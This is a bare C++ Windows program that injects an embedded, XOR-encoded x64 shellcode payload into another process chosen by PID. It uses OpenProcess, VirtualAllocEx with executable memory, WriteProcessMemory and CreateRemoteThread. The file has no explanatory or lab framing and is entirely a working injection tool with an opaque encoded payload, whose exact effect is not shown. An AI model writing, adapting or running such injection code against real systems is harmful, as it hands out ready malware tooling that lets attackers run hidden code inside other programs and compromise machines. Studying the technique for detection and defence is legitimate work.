
#include "Windows.h"
#include <cstdio>
int main(int argc, char *argv[])
{
unsigned char shellcode[] = 
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xbf\xab\xc6\xa5\x82\xd4\x08\x4f\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x43\xe3\x45"
"\x41\x72\x3c\xc8\x4f\xbf\xab\x87\xf4\xc3\x84\x5a\x1e\xe9"
"\xe3\xf7\x77\xe7\x9c\x83\x1d\xdf\xe3\x4d\xf7\x9a\x9c\x83"
"\x1d\x9f\xe3\x4d\xd7\xd2\x9c\x07\xf8\xf5\xe1\x8b\x94\x4b"
"\x9c\x39\x8f\x13\x97\xa7\xd9\x80\xf8\x28\x0e\x7e\x62\xcb"
"\xe4\x83\x15\xea\xa2\xed\xea\x97\xed\x09\x86\x28\xc4\xfd"
"\x97\x8e\xa4\x52\x5f\x88\xc7\xbf\xab\xc6\xed\x07\x14\x7c"
"\x28\xf7\xaa\x16\xf5\x09\x9c\x10\x0b\x34\xeb\xe6\xec\x83"
"\x04\xeb\x19\xf7\x54\x0f\xe4\x09\xe0\x80\x07\xbe\x7d\x8b"
"\x94\x4b\x9c\x39\x8f\x13\xea\x07\x6c\x8f\x95\x09\x8e\x87"
"\x4b\xb3\x54\xce\xd7\x44\x6b\xb7\xee\xff\x74\xf7\x0c\x50"
"\x0b\x34\xeb\xe2\xec\x83\x04\x6e\x0e\x34\xa7\x8e\xe1\x09"
"\x94\x14\x06\xbe\x7b\x87\x2e\x86\x5c\x40\x4e\x6f\xea\x9e"
"\xe4\xda\x8a\x51\x15\xfe\xf3\x87\xfc\xc3\x8e\x40\xcc\x53"
"\x8b\x87\xf7\x7d\x34\x50\x0e\xe6\xf1\x8e\x2e\x90\x3d\x5f"
"\xb0\x40\x54\x9b\xec\x3c\xa3\x7b\x7d\xe0\x98\xf4\xa5\x82"
"\x95\x5e\x06\x36\x4d\x8e\x24\x6e\x74\x09\x4f\xbf\xe2\x4f"
"\x40\xcb\x68\x0a\x4f\xbe\x10\x6a\xbf\x44\xc8\x49\x1b\xf6"
"\x22\x22\xe9\x0b\x25\x49\xf5\xf3\xdc\xe0\xa2\x7d\x01\x44"
"\xc6\x55\xc3\xc7\xa4\x82\xd4\x51\x0e\x05\x82\x46\xce\x82"
"\x2b\xdd\x1f\xef\xe6\xf7\x6c\xcf\xe5\xc8\x07\x40\x6b\x8e"
"\x2c\x40\x9c\xf7\x8f\xf7\x22\x07\xe4\x38\x3e\x07\x90\x5f"
"\x54\x13\xed\x0b\x13\x62\x5f\xfe\xf3\x8a\x2c\x60\x9c\x81"
"\xb6\xfe\x11\x5f\x00\xf6\xb5\xf7\x9a\xf7\x2a\x02\xe5\x80"
"\xd4\x08\x06\x07\xc8\xab\xc1\x82\xd4\x08\x4f\xbf\xea\x96"
"\xe4\xd2\x9c\x81\xad\xe8\xfc\x91\xe8\xb3\x14\x62\x42\xe6"
"\xea\x96\x47\x7e\xb2\xcf\x0b\x9b\xff\xc7\xa4\xca\x59\x4c"
"\x6b\xa7\x6d\xc6\xcd\xca\x5d\xee\x19\xef\xea\x96\xe4\xd2"
"\x95\x58\x06\x40\x6b\x87\xf5\xcb\x2b\xc0\x02\x36\x6a\x8a"
"\x2c\x43\x95\xb2\x36\x73\x94\x40\x5a\x57\x9c\x39\x9d\xf7"
"\x54\x0c\x2e\x8c\x95\xb2\x47\x38\xb6\xa6\x5a\x57\x6f\xf8"
"\xfa\x1d\xfd\x87\x1f\x24\x41\xb5\xd2\x40\x7e\x8e\x26\x46"
"\xfc\x34\x49\xc3\xa1\x46\x5e\x62\xa1\x0d\xf4\xf8\xb8\xb4"
"\xca\xe8\xd4\x51\x0e\x36\x71\x39\x70\x82\xd4\x08\x4f";



	printf("injecting into PID: %i", atoi(argv[1]));
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    if (!processHandle) {
        printf("Failed to open process. Error: (%u)", GetLastError());
        return 1;
    }
	auto remoteBuff = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuff, shellcode, sizeof shellcode, NULL);
	auto remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuff, NULL, 0, NULL);
	CloseHandle(processHandle);

    return 0;
}